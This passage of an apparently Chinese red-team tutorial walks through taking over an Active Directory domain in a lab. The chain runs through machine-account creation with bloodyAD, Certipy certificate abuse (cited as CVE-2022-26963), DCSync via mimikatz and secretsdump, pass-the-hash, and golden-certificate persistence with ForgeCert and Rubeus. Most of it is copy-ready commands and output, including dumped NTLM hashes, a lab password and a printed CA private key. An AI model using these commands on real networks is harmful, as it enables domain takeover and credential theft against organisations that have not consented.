      xBtv7VFy34egqfwDCJ/OHMh9RnLoRdU+0SLNy9ukayiAW7enq8mOUmIecNlwoWt7edR32K7wh3lEOEPZ
      xyl/xdHhLW3cSBIJeMFsbYtBnCvaXccU9TtUvWx7Ohq4OcHb3rjrV5A+UuD8hDbpkdfqiuORgVUhBOxL
      rFrI9MROXAgl0/DnW4jPcBYQ13do1JKa4mrcdiyGoFv1ccyPQ6c8Rrp9Rj3suzyyp9pbboDTAsrFNw5n
      xGeE0FKfsNFtLg2hvTG+kr3MWSP3JIENNku3LQ2b/a0Tjho1HIOq0OIWMG3zcpCrr1RHkpI6R9Vb19t1
      fSxXs5+ZkLSGPx2osfOaXu0A6Yf88sA1QnBduyu35vDVrRbiP0yl6Rq8JO9975NESUfa1yxtnUQFuPBB
      OpWvx5RKHBTCImzDJ5qN9rQ58mJfQmSRLZL6nsS8/AKCDUKXpOjvCPZS+MesPUm/WIG2x5LTdhi/w96R
      6WGEoWt2HEY1JsTjpA85hjjmSCm8YEG4l4SPYtJNbYeI/P0EJ1BUrlGrkL9Z140YCMKALWQA5vRiCeus
      C+tYSOuu/ovBohbkKml2O/MIMIr/qNcVgorJL3u84gC/jgmAGpIXzHEUVhdX+3hb1TJ7bErvHAR8fh2A
      UE35rnGrpATZI3cjtGFE2+ca2xrn5S7qxRTxeuYVrZbBcFCJzkfkYwhQHSyciYvfPJfEF1bGDVQbZNwn
      2x4fp4OQanr2A1y/K3PWMriGbTrKcRM1WXeNwnssSYw63+htzQ9dLB1IeKmbBnWwAyVqLYONKaVrN3z0
      vor936DWNLR2z5AiulopQADxuFIlifEwbkBz4nS87NP6xdo8BecnIdfdbCSwu/fV7ibTDxLC2/xIVtxf
      gjg2oL3m9VSSJ8KxzXXJDQnrqUbh56pK4h4lzjPn02v9cQArbGze/xLjqg03kZ2yRPIrLjb+vnwjRVdb
      6HFU5rl+t5hK0ru5EcLrIUjNyJUpuoF4ld3mnhLDlvJOXIWmKA/RsnHFJ4MQIFQrGqNqOg5NUnJtqHqE
      wMsp5CrCOiClW1jcdS4GqnqfU0VgpkFohR1gNCRzC8SJ3trGSBmWIG07OcXQMsTnmy1Fj1umoLG35JPi
      5Hh53Va0c2dtRcOqZhyuNlaVq3vvAe3H4GxyfmvVMtWVgneFfeimhOiMZiBtuWGDqdI/8h//EJuRYoOj
      iY65Fr6YRQZGcBNZTUVi53Mj65CaPbGYDKq3xuZRVnLmwSLnmcDbPL0GKKesYQQON5TuERTVmzuMxaIO
      lv1KQhtCHzgm9jXPaaW3i9XxbJD878guyS1ftGTfOtNVebajniDn1wny6VNlgFSmq7RBUkJvV6Wj9bDx
      6u2f4siUTEhbdOfOhLZCwyB6b/VWTSgDjlMlUb21LB/IqssOm1H5VxxsGUZ7AM2QKaOBxjCBw6ADAgEA
      ooG7BIG4fYG1MIGyoIGvMIGsMIGpoBswGaADAgEXoRIEEAEuImx9M93oFW7TrHBoVu6hCRsHU1VOLkNP
      TaIUMBKgAwIBAaELMAkbB1NURVZFTiSjBwMFAEDhAAClERgPMjAyMjA1MDcxNTAyNDNaphEYDzIwMjIw
      NTA4MDEwMjQzWqcRGA8yMDIyMDUxNDE1MDI0M1qoCRsHU1VOLkNPTakcMBqgAwIBAqETMBEbBmtyYnRn
      dBsHc3VuLmNvbQ==
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/sun.com
  ServiceRealm             :  SUN.COM
  UserName                 :  STEVEN$
  UserRealm                :  SUN.COM
  StartTime                :  2022/5/7 23:02:43
  EndTime                  :  2022/5/8 9:02:43
  RenewTill                :  2022/5/14 23:02:43
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  AS4ibH0z3egVbtOscGhW7g==
  ASREP (key)              :  C2BA598A364D6C2AAC7E9E6D19120DEE
```

![image-20220507231629613](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-dc7e8e8437119265418cebd93b35d29f58c43993.png)

![image-20220507231706170](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-c8364c2575361e9925afe0635b6e47ee54512a10.png)

查看票据

```php
klist
```

(票据清除)

```php
klist purge
```

![image-20220507225615659](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-6ffa5b715f800fa21367ce02ca4d99348af0b960.png)

使用mimikatz进行dcsync

```php
C:\Users\Administrator\Desktop\shell-master>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /domain:sun.com /all /csv
[DC] 'sun.com' will be the domain
[DC] 'matrix.sun.com' will be the DC server
[DC] Exporting domain 'sun.com'
1103    WIN10-2020BGULZ$        97da10cc3555815eae47095203b597ca        4096
500     Administrator   1f2d1e484ee4dbd339748670b2b4010a        512
502     krbtgt  ec541bca8c17159ee215929d75d1ae3f        514
1000    MATRIX$ 297cbcbc1bf53284b31c0b8ca3a30524        532480
1104    STEVEN$ c59513824e4af2f0e1c7e79130d44c14        532480

mimikatz #
```

![image-20220507230341408](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-f4e1cfda067f7ef0f16bc7e73fee2959bf2ee219.png)

进行pth攻击，获取父域控权限

```php
sekurlsa::pth /user:Administrator /ntlm:1f2d1e484ee4dbd339748670b2b4010a /domain:sun.com /run:cmd
```

![image-20220507231422100](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-1576aaa14b8b3df8a2dc6cce4233d5303e4fcec9.png)

0x00 前言
=======

Active Directory 域权限提升漏洞(CVE-2022-26963 )允许低权限用户在安装了 Active Directory 证书服务 (AD CS) 服务器角色的默认 Active Directory 环境中将权限提升到域管理员

0x01 影响范围
=========

受影响的 Windows 版本：

Windows 8.1

Windows 10 Version 1607, 1809,1909, 2004, 20H2, 21H1, 21H2

Windows 11

Windows Server 2008，2012，2016，2019，2022

0x02 实操
=======

域控：192.168.40.101

域用户：user1/Wsx123.

域内定位CA机器
--------

在域内机器上执行

```php
certutil -config - -ping
```

![image-20220513060605778](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-b9734f0fa0f7505b0c60f1c4daede22ee55c16e4.png)

创建机器账户到域
--------

<https://github.com/CravateRouge/bloodyAD>

使用bloodyAD工具来创建机器账户

查看ms-DS-MachineAccountQuota属性

如果ms-DS-MachineAccountQuota&gt;0就可以创建机器帐户，刚创建时默认是10

```php
python3 bloodyAD.py -d sun.com -u user1 -p 'Wsx123.' --host 192.168.40.101 getObjectAttributes  'DC=sun,DC=com' ms-DS-MachineAccountQuota                     
```

![image-20220513072514004](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-3f428a4ae77c07694a8a4c0fc522fb9a339b6073.png)

在LDAP中创建一个 Computer 对象

```php
python3 bloodyAD.py -d sun.com -u user1 -p 'Wsx123.' --host 192.168.40.101 addComputer user5 'Wsx123.'
```

![image-20220513072707603](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-47aab68c5a2ba6ce21128e6b7f13944347344afd.png)

更新机器帐户的DNS Host Name
--------------------

将机器帐户的DNS Host Name改为域控的MATRIX.sun.com

```php
python3 bloodyAD.py -d sun.com -u user1 -p 'Wsx123.' --host 192.168.40.101 setAttribute 'CN=user5,CN=Computers,DC=sun,DC=com' dNSHostName '["MATRIX.sun.com"]'
```

![image-20220513072928301](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-7b277820e6f473030449fb8bb1177bee6e7d6b3c.png)

查看属性，是否成功更改为域控的DNS Host Name

```php
python3 bloodyAD.py -d sun.com -u user1 -p 'Wsx123.' --host 192.168.40.101 getObjectAttributes 'CN=user5,CN=Computers,DC=sun,DC=com' dNSHostName                  
```

![image-20220513073022117](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-6764cf98d5adfe6a6bda0b7cd6f4421ad4783e72.png)

伪造恶意证书
------

<https://github.com/ly4k/Certipy>

使用Certipy生成机器证书，可以看到DNS Host Name已经变成了dc.sun.com：

```php
certipy req 'sun.com/user5$:Wsx123.@192.168.40.101' -template Machine -dc-ip 192.168.40.101 -ca sun-MATRIX-CA
```

![image-20220513073423148](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-f1052cb0b5c4326c21e88c2c795170005f4a534d.png)

申请TGT
-----

使用带有上面请求的证书的获取 TGT

```php
# certipy auth -pfx ./matrix.pfx -dc-ip 192.168.40.101
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[*] Using principal: matrix$@sun.com
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'matrix.ccache'
[*] Trying to retrieve NT hash for 'matrix$'
[*] Got NT hash for 'matrix$@sun.com': 297cbcbc1bf53284b31c0b8ca3a30524
```

![image-20220513073518511](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-977740c2cf0938e772dea97a5fb7d07a2646e97f.png)

DCSync
------

对导出的 TGT 执行 DCSync，来dump哈希

```php
impacket-secretsdump 'sun.com/matrix$@matrix.sun.com' -hashes :297cbcbc1bf53284b31c0b8ca3a30524
```

![image-20220513073856813](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-d0080521cb90ed45b4076585c6de6d4140ea9300.png)

0x03 权限维持
=========

导出私钥
----

### 界面操作

在ADCS中，打开证书颁发机构

```php
certsrv.msc
```

![图片.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-12ceb4a406201fe1e144d90fa3ee12899ec18876.png)

所有任务--&gt;备份CA

![图片.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-4323fecd1c76e7af65158e29c83c20109b5a2b0a.png)

进行导出，导出格式选择`*.PFX`、`*.p12`都可以

![图片.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-f923d73ec80bb0b9c22471e658ae3f50fa83073b.png)

![图片.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-d9a79b97d87cbd7df75768030615f2247d074196.png)

这里输入的密码需要牢记，后面伪造证书时需要

![图片.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-5a65e9f853e80a9dea7b4262a129eb8a76f8305b.png)

![图片.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-28dafd0f6fc42f319959d539fb34fb989d3669a7.png)

### 命令行操作

使用SharpDPAPI，参考：<https://github.com/GhostPack/SharpDPAPI>

```php
SharpDPAPI.exe certificates /machine
```

![图片.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-34c6d012ce2cd42563e97ff1b8da83794e291587.png)

![图片.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-ff9111f75f88c6ba6201ee9d8408abfd0e722cf3.png)

![图片.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-a1cf8ed5921a4d9fe9210a7fb093b25bc39ff9a6.png)

```php
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEArGw/w8kFHUHfh9dDnP0JA0rNXzfH4QPSjNt8KZ6H/HB6DfLh
YFmCQ5ICmZChF1cX/jUTgoMUQKKwpL5PVPmKEpU5pVMWKpJ0QfSUo1bpKm8Ddm82
V95L8dulXQoTvk7ULRNrV5Gb9ZfTNDIqlvTxfDCLveoEsl47KngewQmJWOmCJVAK
aG2IYOMn5aCaCbMGq5a2Zasn+y8cgJnUu2XFesEGD9PYJXcatXNirHyugtoWzeON
G8zSazA7LUxc7c5p7TA+dKl0sRMAoQUbaCCeUqlu+s1ad8FzbOOQuNbVGXWVQCww
QigYzht7thIEBTAwW+NxQfMCxKNfemey2nq2YQIDAQABAoIBABBiUubUTbebgFWk
p2ieBMK602wWXVhs6A95dcFwroRW3cpAh5kDuGSaVcPo4d3ZaU6/FWUD9qMzsmxd
JyWwdqXQZ0Nl80fFVeXEi3E/+3UMSnxxEe1kkrvfPsXqBLlDPVcxLrSKAhNiw2+E
ytZAXUgLRuQbfinC2YVuF6IJOXNoyNFegSkIJLKmma80kvMqcbL6u/GLsxAfG/ch
OsAhBhV1mD5q5Lzb9aO3hpQsJzQ/oR6qYAWTpQv/zkHNZEV5o3a09gafWwsHv7Tr
VSO7G9rnSIluDPoLf5RIaFoxOkxJUkQUPSTryGa8gDuc3oxXjuhqFkVNOkOpsppL
gIEcUU8CgYEA6MAZZFhGcHNMaNAwqnwqXRpl+ulHJsjcsd97sL51GdebEVgubU9B
P02ztn0fO7oizHo5RpDwgEgS89LU8BGHICMm1MqhHcJY09JmtCYe+NaV2dOI8OzW
uH7g9QMedH8A+K8MVFFUVo6Z1o5b7pks6yUDlVjNuTRX6OiinCoYz/cCgYEAvaVz
tqDMmvffyBLmAxcA2N1yy8tVKQRbK0BnNwbggZrmFhi3j2RVSL7JwKDLAZjkyCAt
dsjdfMKeksg3/hm30ulILNIoqgl5/uczIS/JDshDs7VaeHX+dPkRm2sAz15EvTs1
Y/sl9iVoKNHAEPk8IgwvG4zrgeLXV70dK7YKxmcCgYBmL3i2cn8yfZxtZAIJx4u9
5oohd+uyHnuuaETg2y2EVAGTwthXS3WE+nNNSm+9BEKk7YBZ9+ZvG7WecNDmOXvO
4z/4KqJD84CWNwi6TQZKD8Qop1O3GvRGegX/7Aeh8+SUSh4qoq5ZdjAaX9QC1CNB
dbW2Cw//IPj7m69QyrasDwKBgHSgPhPuuUUH8K/Kp3b4+4ViUglwBvQNgL+NgKv/
Z6tshdjK5H+jNStiYRI8D/vweal02GC3UDY8PWaJCJ4UVM64tbESoP1IjKSsq+3Z
xCx6DeCDQ5rW/WAUF7bbTAk6sM0qjz/oIEVKZc7MhvApRciuc33e4KnkxYdofnr2
HZQ7AoGAPuuNNYtpEp09YH0H0fEvphvcd/nNXzXmtsm5uEcPUIvEk/5c9PRkrG8p
GsFmaX586Yl7BlOoWFFHd8hLwx5Blt12//q9IFEQMIqSo0/4X2JbSyb87cM9ppRb
LmMpxKHZLdA8LKgOXpLajjLs6E3WKFWi6onBerQ9UOz3v3fjcGk=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIDXzCCAkegAwIBAgIQHLWcNl+enYBDrnZIDpBhWzANBgkqhkiG9w0BAQsFADBC
MRMwEQYKCZImiZPyLGQBGRYDY29tMRMwEQYKCZImiZPyLGQBGRYDc3VuMRYwFAYD
VQQDEw1zdW4tTUFUUklYLUNBMB4XDTIyMDUwNzA4MjExMloXDTI3MDUwNzA4MzEx
MlowQjETMBEGCgmSJomT8ixkARkWA2NvbTETMBEGCgmSJomT8ixkARkWA3N1bjEW
MBQGA1UEAxMNc3VuLU1BVFJJWC1DQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
AQoCggEBAKxsP8PJBR1B34fXQ5z9CQNKzV83x+ED0ozbfCmeh/xweg3y4WBZgkOS
ApmQoRdXF/41E4KDFECisKS+T1T5ihKVOaVTFiqSdEH0lKNW6SpvA3ZvNlfeS/Hb
pV0KE75O1C0Ta1eRm/WX0zQyKpb08Xwwi73qBLJeOyp4HsEJiVjpgiVQCmhtiGDj
J+WgmgmzBquWtmWrJ/svHICZ1LtlxXrBBg/T2CV3GrVzYqx8roLaFs3jjRvM0msw
Oy1MXO3Oae0wPnSpdLETAKEFG2ggnlKpbvrNWnfBc2zjkLjW1Rl1lUAsMEIoGM4b
e7YSBAUwMFvjcUHzAsSjX3pnstp6tmECAwEAAaNRME8wCwYDVR0PBAQDAgGGMA8G
A1UdEwEB/wQFMAMBAf8wHQYDVR0OBBYEFE38bnpAIzVQfsJFhgc1pfo+FoghMBAG
CSsGAQQBgjcVAQQDAgEAMA0GCSqGSIb3DQEBCwUAA4IBAQA0AONEbI2f9BxOAfxX
ZEMfQKnLApRkXq0PUYqcKaTiystMYHzc8DC1Y+jZo4ch+vyqzYRZ45WRcDC21gi8
y9Atsl8IvbwOkFvsbQtcf28Nbb2Dh6UYqpuzDUd/NuIZNMrSkjaBtzYuxmFzN7+l
VjBzm3rhh8ycVB4Hr99Me2cCjjtxEju73qASs941VLI/V3nWXeVlqNMbdVuhuO6r
SCqM991KuvO6LWZ/aSUpUxiltObN99l7JJnhHLDGh5P/EQLxrrDSXywFhhnq2Toj
Jt97Egk00E+hAK7BGV2XXUJxc7pdmz2S9V5Wimp+DdSF9Mrnv7v8H7CGRx71Irad
Jk4X
-----END CERTIFICATE-----
```

按照提示将pem文件转换为PFX文件

```php
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

输入的密码需要牢记，后面伪造证书时需要

![图片.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-9033b8907d4f753b0d10df6be2cac18262fc9adc.png)

制作伪造证书
------

使用ForgeCert，参考：<https://github.com/GhostPack/ForgeCert>

P12和PFX使用方法是一致的

`CaCertPassword`：导出证书时设置的密码 `NewCertPassword`：伪造证书添加的密码

```php
ForgeCert.exe --CaCertPath cert.pfx --CaCertPassword "Wsx123." --Subject "CN=User" --SubjectAltName "matrix@sun.com" --NewCertPath new.pfx --NewCertPassword "Password123!"
```

![图片.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-9dbd96f3112d73df44110907b097535bb3b4ffca.png)

获取`ticket.kirbi`
----------------

利用Rubeus获取`ticket.kirbi`

```php
Rubeus.exe asktgt /user:matrix /certificate:new.pfx /password:Password123!
```

![图片.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-1628a87a94bc96b9ec39822adfd470f6353efac6.png)

![图片.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-c21b1c342088ab6aa54a40a5a487f00d48851b33.png)

注意
--

伪造证书的账户需要时域用户或者机器账户，不能是`krbtgt`账户

希望可以帮到各位师傅!